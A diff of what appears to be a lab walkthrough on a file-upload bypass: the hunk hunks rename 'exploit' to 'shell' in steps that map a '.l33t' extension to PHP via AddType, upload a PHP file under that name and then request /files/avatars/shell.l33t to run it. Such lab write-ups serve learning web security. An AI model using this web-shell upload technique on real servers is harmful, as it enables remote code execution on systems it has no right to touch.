@@ -77,13 +77,13 @@ AddType application/x-httpd-php .l33t
 16. Change the filename from:
 
 ```http
-exploit.php
+shell.php
 ```
 
 to:
 
 ```http
-exploit.l33t
+shell.l33t
 ```
 
 17. Keep the PHP payload unchanged and send the request again.
@@ -95,7 +95,7 @@ exploit.l33t
 20. Replace the image filename with:
 
 ```http
-GET /files/avatars/exploit.l33t HTTP/1.1
+GET /files/avatars/shell.l33t HTTP/1.1
 ```
 
 21. Send the request.
@@ -130,13 +130,13 @@ Content-Type: text/plain
 ### PHP File Upload
 
 ```http
-filename="exploit.l33t"
+filename="shell.l33t"
 ```
 
 ### Request
 
 ```http
-GET /files/avatars/exploit.l33t HTTP/1.1
+GET /files/avatars/shell.l33t HTTP/1.1
 ```
 
 ## Result
